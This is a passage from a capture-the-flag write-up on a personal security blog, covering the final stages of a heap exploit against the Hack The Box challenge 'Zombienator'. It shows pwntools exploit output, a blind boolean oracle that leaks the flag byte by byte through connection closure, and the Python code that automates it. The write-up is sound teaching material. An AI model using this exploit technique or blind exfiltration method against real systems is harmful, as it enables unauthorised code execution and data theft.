</code></pre></div><p>It looks like it failed, but we do have a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './zombienator'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Starting local process './zombienator': pid 2163908
[<span class="code-green">+</span>] Glibc base address: 0x7fcd78a00000
[<span class="code-blue">*</span>] Loaded 219 cached gadgets for 'glibc/libc.so.6'
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span> ls
<span class="code-red">$</span> whoami
<span class="code-red">$</span> whoami &gt; whoami.txt
<span class="code-red">$</span> exit
<span class="code-red">$</span>
[<span class="code-blue">*</span>] Process './zombienator' stopped with exit code 0 (pid 2163908)  
[<span class="code-blue">*</span>] Got EOF while sending in interactive

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">whoami.txt</span>
rocky
</code></pre></div><p>The problem here is that <code>stdout</code> and <code>stderr</code> are closed in <code>attack</code>, so we can&rsquo;t read outputs, but we can still use <code>stdin</code>.</p><h3 id="flag-exfiltration">Flag exfiltration</h3><p>There are several approaches to get a proper shell, but during the CTF I came up with a boolean-based oracle:</p><p>In this situation, I am able to execute commands but I don&rsquo;t see the output. With this, I tried to get the flag byte by byte. The idea is to test characters in a loop until we get the correct one. At that point, we call <code>exit</code> and close the connection. As a result, we know when the connection is closed and can determine which is the correct character.</p><p>The shell command I used is this one:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">sh</span>
$ cut -c 1-1 flag.txt | grep H  
H
$ echo $?
0
$ cut -c 1-1 flag.txt | grep A
$ echo $?
1
</code></pre></div><p>Notice that when the character is correct, we have an exit code <code>0</code>, otherwise we have <code>1</code>. Using this, we can add <code>&& exit</code> to close the connection when the character is correct.</p><p>For the remote exfiltration, I added a conversion to hexadecimal to avoid special characters:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">$ cut -c 1-1 flag.txt | xxd -p | grep 480a  
480a
$ cut -c 1-1 flag.txt | xxd -p | grep 410a
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">7f</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"cut -c </span><span class="mtk6">{</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1}</span><span class="mtk4">-</span><span class="mtk6">{</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1}</span><span class="mtk4"> flag.txt | xxd -p | grep </span><span class="mtk6">{</span><span class="mtk1">c</span><span class="mtk7 mtki">:02x</span><span class="mtk6">}</span><span class="mtk4">0a &amp;&amp; exit"</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
<span class="mtk1">            </span><span class="mtk8">sleep</span><span class="mtk1">(</span><span class="mtk6">.1</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendline</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'echo'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">EOFError</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">flag</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">c</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">)</span>
</code></pre></div><p>Moreover, I added a sanity check on the Glibc base address, to avoid errors:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">).</span><span class="mtk8">startswith</span><span class="mtk1">(</span><span class="mtk4">'0x7'</span><span class="mtk1">) </span><span class="mtk5">or</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">).</span><span class="mtk8">endswith</span><span class="mtk1">(</span><span class="mtk4">'000'</span><span class="mtk1">):</span>  
<span class="mtk1">        </span><span class="mtk5">return</span>
</code></pre></div><p>Now, we must execute the <code>main</code> function until we have the complete flag:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk1">flag</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> []</span>
<span class="mtk1">    </span><span class="mtk1">flag_prog</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">progress</span><span class="mtk1">(</span><span class="mtk4">'Flag'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> </span><span class="mtk8">ord</span>(<span class="mtk4">'}'</span>)<span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">flag</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">flag_prog</span><span class="mtk1">.</span><span class="mtk8">status</span><span class="mtk1">(</span><span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">())</span>

<span class="mtk1">        </span><span class="mtk5">with</span><span class="mtk1"> </span><span class="mtk1">context</span><span class="mtk1">.</span><span class="mtk8">local</span><span class="mtk1">(</span><span class="mtk9 mtki">log_level</span><span class="mtk5">=</span><span class="mtk4">'CRITICAL'</span><span class="mtk1">):</span>  
<span class="mtk1">            </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">            </span><span class="mtk8">main</span><span class="mtk1">()</span>
<span class="mtk1">            </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">flag_prog</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1">).</span><span class="mtk8">decode</span><span class="mtk1">())</span>
</code></pre></div><h2 id="flag">Flag</h2><p>And here&rsquo;s the flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 94.237.63.93:47583
[<span class="code-blue">*</span>] './zombienator'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'./glibc/'</span>
[<span class="code-green">+</span>] Flag: HTB{tc4ch3d_d0ubl3_numb3r5_4r3_0p}  
</code></pre></div><p>The full exploit code is here: <a target="_blank" href="https://github.com/7Rocky/CTF-scripts/tree/main/HTB%20UniCTF/Pwn/Zombienator/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#show-function">Show function</a></li><li><a href="#attack-function">Attack function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#getting-rce">Getting RCE</a></li><li><a href="#flag-exfiltration">Flag exfiltration</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>